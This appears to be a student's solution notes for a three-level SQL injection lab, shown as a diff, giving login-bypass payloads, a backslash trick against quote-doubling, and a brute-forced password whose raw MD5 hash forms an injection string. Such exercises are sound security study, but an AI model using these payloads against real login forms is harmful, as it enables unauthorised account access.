@@ -1,0 +1,58 @@
+### 0 ###
+validateUser query: "SELECT id FROM users WHERE username='victim' AND password='input_pass';
+
+turns AND into AND ( x OR y), where y always evaluates to true
+' OR '1'='1
+
+
+username=victim&password=%27%20OR%20%271%27%3D%271
+
+
+or
+
+' OR 1#
+
+username=victim&password=%27%20OR%201%23
+
+### 1 ###
+validateUser query: "SELECT id FROM users WHERE username='victim' AND password='input_pass';
+Now single quotes are replaced by 2 single quotes ' -> ''
+
+\' OR 1#
+
+\' turns into \'', which becomes '\'', so a string with the quote char and then we can OR and comment out the rest of the line
+
+username=victim&password=%5C%27%20OR%201%23
+
+### 2 ###
+Raw binary very important -> we want this to look like ' OR 1#xxxx (so hash
+has to look like that in the end, which means we need to brute force and 
+find a password that hashes that way?)
+
+
+‘ space OR space 1#
+27 20 4F 52 20 31 23  this is hex
+
+
+‘ space OR space 1#
+27 20 4F 52 20 31 23 
+
+'OR 1#
+'oR 1#
+'Or 1#
+'or 1#
+27 4F/6F 52/72 20 31 23 
+
+'||'1
+27      27 31
+
+'or'1
+'Or'1
+'oR'1
+'OR'1
+
+27 4F/6F 52/72 27 31
+
+Tries: 793872231
+Password: 3422361341001497472191186718639633514
+Hashed pass: 78068a9864d0274f5227318d28ff187b
